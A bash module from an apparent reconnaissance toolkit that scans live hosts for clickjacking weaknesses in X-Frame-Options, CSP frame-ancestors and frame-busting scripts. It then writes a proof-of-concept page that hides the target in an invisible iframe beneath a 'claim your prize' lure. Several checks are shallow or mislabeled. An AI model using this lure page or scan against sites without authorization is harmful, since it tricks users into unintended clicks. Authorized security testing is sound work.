#!/bin/bash
# Clickjacking and frame-ancestors policy testing, CSP frame-ancestors validation, X-Frame-Options bypass

clickjack_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local clickjack_dir="$output_dir/clickjack"
    local live_file="$output_dir/live/live_subdomains.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$clickjack_dir"

    log "INFO" "Starting clickjacking testing for $domain"
    py_log "INFO" "clickjack_phase started" --phase "clickjack" --target "$domain" || true

    local clickjack_vulns="$clickjack_dir/clickjack_vulns.txt"
    local frame_policy="$clickjack_dir/frame_policy.txt"
    touch "$clickjack_vulns" "$frame_policy"

    if [ ! -f "$live_file" ]; then
        log "WARN" "No live hosts file found, skipping clickjacking testing"
        echo "0" > "$clickjack_dir/count.txt"
        return 0
    fi

    # ------------------------------------------------------------------
    # 1. X-Frame-Options header check
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Checking X-Frame-Options headers..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            local headers
            headers=$(curl -s -D - -o /dev/null --max-time 10 "$host" 2>/dev/null) || true
            local xfo
            xfo=$(echo "$headers" | grep -i "^x-frame-options:" | head -1 | tr -d '\r\n')

            if [ -z "$xfo" ]; then
                echo "NO_XFO: $host | X-Frame-Options header missing" >> "$clickjack_vulns"
                write_finding "{\"type\":\"clickjacking_no_xfo\",\"url\":\"$host\",\"severity\":\"medium\",\"domain\":\"$domain\"}" "$clickjack_dir/findings.json" || true
            else
                echo "$host | $xfo" >> "$frame_policy"
            fi
        done < <(head -30 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 2. CSP frame-ancestors check
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Checking CSP frame-ancestors policy..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            local headers
            headers=$(curl -s -D - -o /dev/null --max-time 10 "$host" 2>/dev/null) || true
            local csp
            csp=$(echo "$headers" | grep -i "^content-security-policy:" | tr -d '\r\n')

            if [ -n "$csp" ]; then
                local frame_ancestors
                frame_ancestors=$(echo "$csp" | grep -oP "frame-ancestors[^;]*" 2>/dev/null) || true
                if [ -z "$frame_ancestors" ]; then
                    echo "CSP_NO_FRAME_ANCESTORS: $host | CSP set but no frame-ancestors directive" >> "$clickjack_vulns"
                elif echo "$frame_ancestors" | grep -qE "\*"; then
                    echo "CSP_WEAK_FRAME_ANCESTORS: $host | frame-ancestors allows all origins" >> "$clickjack_vulns"
                    write_finding "{\"type\":\"clickjacking_weak_csp_frame\",\"url\":\"$host\",\"severity\":\"medium\",\"domain\":\"$domain\"}" "$clickjack_dir/findings.json" || true
                else
                    echo "$host | $frame_ancestors" >> "$frame_policy"
                fi
            else
                echo "NO_CSP: $host | No Content-Security-Policy header" >> "$clickjack_vulns"
            fi
        done < <(head -30 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 3. X-Frame-Options bypass attempts
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing X-Frame-Options bypass techniques..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            local headers
            headers=$(curl -s -D - -o /dev/null --max-time 10 "$host" 2>/dev/null) || true
            local xfo
            xfo=$(echo "$headers" | grep -i "^x-frame-options:" | head -1 | tr -d '\r\n')

            if [ -n "$xfo" ]; then
                # Test bypass via meta tag override
                local body
                body=$(curl -s --max-time 10 "$host" 2>/dev/null) || true
                if echo "$body" | grep -qiE '<meta.*http-equiv.*x-frame-options'; then
                    echo "XFO_META_BYPASS: $host | X-Frame-Options overridden by meta tag" >> "$clickjack_vulns"
                    write_finding "{\"type\":\"clickjacking_xfo_meta_bypass\",\"url\":\"$host\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$clickjack_dir/findings.json" || true
                fi
                # Test lowercase bypass
                local xfo_lower
                xfo_lower=$(echo "$xfo" | tr '[:upper:]' '[:lower:]')
                if echo "$xfo_lower" | grep -q "sameorigin"; then
                    echo "$host | XFO SAMEORIGIN (may be bypassed with XSS)" >> "$frame_policy"
                fi
            fi
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 4. Frame-busting script detection and bypass
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Checking for frame-busting scripts..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            local body
            body=$(curl -s --max-time 10 "$host" 2>/dev/null) || true
            if echo "$body" | grep -qiE "(if\s*\(\s*top\s*!=\s*self|window\.top\.location|top\.location\.href|frameElement|parent\.frames)"; then
                echo "FRAME_BUSTING_SCRIPT: $host | Client-side frame-busting detected" >> "$frame_policy"
                # Check if sandboxing bypass is possible
                if echo "$body" | grep -qiE "sandbox"; then
                    echo "FRAME_BUSTING_SANDBOX_BYPASS: $host | sandbox attribute may bypass frame-busting" >> "$clickjack_vulns"
                fi
            fi
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 5. Clickjacking PoC page generation
    # ------------------------------------------------------------------
    log "INFO" "Generating clickjacking PoC templates..."
    cat > "$clickjack_dir/clickjack_poc.html" << 'POCEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe { border: 0; width: 100%; height: 100vh; position: absolute; opacity: 0.0001; }
        button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; padding: 20px; font-size: 24px; background: red; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <button>Click here to claim your prize!</button>
    <iframe src="TARGET_URL"></iframe>
</body>
</html>
POCEOF

    if [ -f "$clickjack_vulns" ] && [ -s "$clickjack_vulns" ]; then
        local vuln_url
        vuln_url=$(head -1 "$clickjack_vulns" | awk '{print $2}')
        if [ -n "$vuln_url" ]; then
            sed -i "s|TARGET_URL|$vuln_url|g" "$clickjack_dir/clickjack_poc.html" 2>/dev/null || true
        fi
    fi

    # ------------------------------------------------------------------
    # 6. Summary count
    # ------------------------------------------------------------------
    local total_vulns
    total_vulns=$(( $(wc -l < "$clickjack_vulns" 2>/dev/null || echo 0) \
                 + $(wc -l < "$frame_policy" 2>/dev/null || echo 0) ))
    log "INFO" "Clickjacking testing complete: $total_vulns policy entries found"

    py_log "INFO" "clickjack_phase complete" --phase "clickjack" --target "$domain" --extra "{\"vulns\":$total_vulns}" || true
    echo "$total_vulns" > "$clickjack_dir/count.txt"
}

export -f clickjack_phase
